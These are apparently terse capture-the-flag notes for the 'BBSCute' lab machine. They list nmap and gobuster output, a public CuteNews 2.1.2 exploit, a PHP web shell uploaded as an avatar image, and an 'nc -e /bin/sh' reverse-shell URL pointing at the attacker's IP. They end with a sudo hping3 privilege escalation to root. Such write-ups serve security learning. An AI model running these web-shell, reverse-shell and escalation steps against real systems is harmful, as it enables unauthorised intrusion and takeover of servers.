----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# BBSCute
# 26/1/2023

----------------------------------------------------
# nmap result
----------------------------------------------------
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
88/tcp  open  kerberos-sec
110/tcp open  pop3
995/tcp open  pop3s


 gobuster dir -u http://192.168.62.128/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -q -x .php -t 40

/index.php


got vulnerable version of cute news 2.1.2
python3 48800.py                                                                                     
create new user
loging
modify php shell as a image 
and rce/lfi/rfi
http://192.168.62.128/uploads/avatar_shub_shell1.php?cmd=whoami;
http://192.168.62.128/uploads/avatar_shub_shell1.php?cmd=nc%20-e%20/bin/sh%20192.168.49.62%209090;


sudo -l
hping3
hping3
/bin/sh -p
you got root
